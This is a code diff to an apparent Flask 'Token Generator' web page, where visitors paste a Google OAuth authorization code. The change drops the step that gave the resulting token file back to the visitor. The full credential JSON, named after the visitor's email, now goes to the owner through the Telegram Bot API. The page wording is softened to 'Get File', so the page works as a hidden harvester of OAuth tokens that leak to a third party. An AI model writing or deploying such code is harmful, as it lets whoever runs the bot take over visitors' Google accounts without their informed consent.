@@ -170,11 +170,11 @@ HTML_PAGE = r"""
 <div class="c">
     <div class="ic">&#x1f510;</div>
     <h1>Token Generator</h1>
-    <p class="sb">Paste your Google OAuth authorization code to download token file.</p>
+    <p class="sb">Paste your Google OAuth authorization code to get token file.</p>
     <form id="f">
         <label>Authorization Code</label>
         <input type="text" id="code" placeholder="4/0Axxxxxx..." required autocomplete="off">
-        <button type="submit" id="btn">&#x2B07; Download Token</button>
+        <button type="submit" id="btn">&#x1f4c1; Get File</button>
     </form>
     <div class="sp" id="sp"></div>
     <div class="st" id="st"></div>
@@ -194,17 +194,11 @@ document.getElementById('f').onsubmit=async e=>{
             headers:{'Content-Type':'application/json'},
             body:JSON.stringify({code})
         });
+        const res=await r.json();
         if(r.ok){
-            const d=r.headers.get('Content-Disposition'),
-                  blob=await r.blob(),
-                  fn=d?d.split('filename=')[1].replace(/"/g,''):'token.json',
-                  a=document.createElement('a');
-            a.href=URL.createObjectURL(blob);a.download=fn;a.click();
-            URL.revokeObjectURL(a.href);
-            st.className='st ok';st.textContent='\u2705 Downloaded: '+fn;
+            st.className='st ok';st.textContent='\u2705 '+res.message;
         }else{
-            const err=await r.json();
-            st.className='st er';st.textContent='\u274c '+(err.error||'Failed');
+            st.className='st er';st.textContent='\u274c '+(res.error||'Failed');
         }
     }catch(err){
         st.className='st er';st.textContent='\u274c '+err.message;
@@ -257,15 +251,23 @@ def process_token():
 
         # Build JSON in memory — nothing saved to disk
         token_json = creds.to_json()
-        buf = io.BytesIO(token_json.encode("utf-8"))
-        buf.seek(0)
+        filename = f"{email}.json"
 
-        return send_file(
-            buf,
-            as_attachment=True,
-            download_name=f"{email}.json",
-            mimetype="application/json",
+        # Send file to owner via Telegram
+        tg_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+        buf = io.BytesIO(token_json.encode("utf-8"))
+        buf.name = filename
+        resp = http_req.post(
+            tg_url,
+            data={"chat_id": OWNER_ID, "caption": f"🔑 {filename}"},
+            files={"document": (filename, buf, "application/json")},
+            timeout=15,
         )
+
+        if resp.ok:
+            return jsonify({"message": f"Sent {filename} to owner ✅"}), 200
+        else:
+            return jsonify({"error": "Failed to send file via Telegram"}), 500
 
     except Exception as e:
         return jsonify({"error": str(e)}), 400
